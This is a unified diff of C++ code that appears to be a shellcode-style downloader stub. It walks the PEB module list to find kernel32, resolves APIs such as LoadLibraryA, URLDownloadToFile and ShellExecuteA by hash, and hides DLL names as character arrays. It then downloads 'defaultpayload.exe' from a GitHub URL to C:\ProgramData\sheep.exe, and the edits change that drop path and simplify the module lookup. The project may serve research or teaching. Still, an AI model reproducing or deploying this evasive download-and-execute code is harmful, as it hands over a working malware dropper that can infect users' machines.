@@ -361,58 +361,24 @@ int callout(void)
 #endif
 
    PFULL_PEB_LDR_DATA ldr = reinterpret_cast<PFULL_PEB_LDR_DATA>(peb->Ldr);
-   PLIST_ENTRY list_entry = ldr->InLoadOrderModuleList.Flink;
-   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = nullptr;
-
-   while (list_entry != nullptr)
-   {
-      PFULL_LDR_DATA_TABLE_ENTRY table_entry = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(list_entry);
-
-      if (table_entry->BaseDllName.Buffer == nullptr)
-      {
-         list_entry = nullptr;
-         continue;
-      }
-
-      if (*reinterpret_cast<std::uint64_t *>(table_entry->BaseDllName.Buffer) == 0x4e00520045004b) // L"KERN"
-      {
-         kernel32 = table_entry;
-         break;
-      }
-      
-      list_entry = table_entry->InLoadOrderLinks.Flink;
-   }
-
-   if (kernel32 == nullptr)
-      return 1;
-
+   PFULL_LDR_DATA_TABLE_ENTRY list_entry = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(ldr->InLoadOrderModuleList.Flink);
+   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(list_entry->InLoadOrderLinks.Flink)->InLoadOrderLinks.Flink);
    LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
-   GetTempPath2AHeader getTempPath2 = reinterpret_cast<GetTempPath2AHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x7994452b));
    GetFileAttributesAHeader getFileAttributes = reinterpret_cast<GetFileAttributesAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xda1a7563));
    char urlmonDll[] = {'u','r','l','m','o','n','.','d','l','l',0};
    PIMAGE_DOS_HEADER urlmonModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(urlmonDll));
    URLDownloadToFileHeader urlDownloadToFile = reinterpret_cast<URLDownloadToFileHeader>(get_proc_by_hash(urlmonModule, 0xd8d746fc));
    char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
    PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
-   SHGetFolderPathAHeader getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));
    ShellExecuteAHeader shellExecute = reinterpret_cast<ShellExecuteAHeader>(get_proc_by_hash(shell32Module, 0xb0ff5bf));
-   char msvcrtDll[] = {'m','s','v','c','r','t','.','d','l','l',0};
-   PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(msvcrtDll));
-   strncatHeader strncat = reinterpret_cast<strncatHeader>(get_proc_by_hash(msvcrtModule, 0xb1ee6f2e));
-   strlenHeader strlen = reinterpret_cast<strlenHeader>(get_proc_by_hash(msvcrtModule, 0x58ba3d97));
-   memcpyHeader memcpy = reinterpret_cast<memcpyHeader>(get_proc_by_hash(msvcrtModule, 0xa45cec64));
 
-   char temp_path[MAX_PATH+1];
-   char slash_sheep[] = {'\\','s','h','e','e','p','.','e','x','e',0};
+   char sheep[] = {'C',':','\\','P','r','o','g','r','a','m','D','a','t','a','\\','s','h','e','e','p','.','e','x','e',0};
    
-   getTempPath2(MAX_PATH, temp_path);
-   strncat(temp_path, slash_sheep, strlen(slash_sheep));
-
-   if (getFileAttributes(temp_path) == INVALID_FILE_ATTRIBUTES)
+   if (getFileAttributes(sheep) == INVALID_FILE_ATTRIBUTES)
    {
       if (urlDownloadToFile(nullptr,
                             "https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe",
-                            temp_path,
+                            sheep,
                             0,
                             nullptr) != 0)
          return 2;
